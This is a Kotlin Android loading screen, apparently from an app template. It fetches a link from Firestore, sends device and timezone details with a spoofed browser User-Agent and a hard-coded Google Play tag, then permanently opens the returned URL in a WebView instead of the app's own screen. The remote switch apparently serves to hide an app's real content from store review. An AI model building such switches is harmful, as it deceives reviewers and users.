package com.template

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.nio.charset.Charset
import java.util.*


class LoadingActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        readPreference()
    }

    private fun writePreference(text: String){
        getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE).apply {
            edit().apply{
                putString(URL_KEY, text)
                apply()
            }
        }
    }

    private fun readPreference(){
        val sharedPreference =  getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE)
        when (val url = sharedPreference.getString(URL_KEY, FIRST_TIME)){
            FIRST_TIME -> {
                if (checkConnection())
                    getInFirebase()
                else{
                    startMainActivity()
                }
            }
            NO_DATA -> startMainActivity()
            else -> {
                if (checkConnection())
                    startWebActivity(url!!)
                else
                    startMainActivity()
            }
        }
    }

    private fun getInFirebase(){
        val db = Firebase.firestore
        db.collection("database")
            .get()
            .addOnSuccessListener { result ->
                try{
                    val resultText = result.documents[0].data?.get("link")
                    if (resultText?.equals("") == true){
                        writePreference(NO_DATA)
                        startMainActivity()
                    }
                    else {
                        val finalText = "$resultText/?packageid=$packageName&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic"
                        getUrlFromWeb(finalText)
                    }
                }catch (e: Exception) {
                    writePreference(FIRST_TIME)
                    startMainActivity()
                }
            }
            .addOnFailureListener {
                writePreference(FIRST_TIME)
                startMainActivity()
            }
    }

    private fun startMainActivity(){
        startActivity(Intent(this, MainActivity::class.java))
    }

    private fun startWebActivity(url: String){
        startActivity(WebActivity.intentWebActivity(this, url))
    }

    private fun getUrlFromWeb(url: String)  {

        val queue = Volley.newRequestQueue(this)
        val requestBody = "Accept=application/json" + "User-Agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        val stringReq : StringRequest =
            object : StringRequest(Method.POST, url,
                Response.Listener { response ->
                    val strResp = response.toString()
                    writePreference(strResp)
                    startWebActivity(strResp)
                },
                Response.ErrorListener {
                    writePreference(NO_DATA)
                    startMainActivity()
                }
            ){
                override fun getBody(): ByteArray {
                    return requestBody.toByteArray(Charset.defaultCharset())
                }
            }
        queue.add(stringReq)
    }

    private fun checkConnection(): Boolean {
        val connectivityManager = this.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val wifi = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        val mobileNetwork = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
        return (wifi!!.isConnected || mobileNetwork!!.isConnected)
    }

    companion object{
        const val URL_KEY = "url_key"
        const val NO_DATA = "no_data"
        const val FIRST_TIME = "first_time"
        const val PREFERENCE_NAME = "preference_name"
    }
}
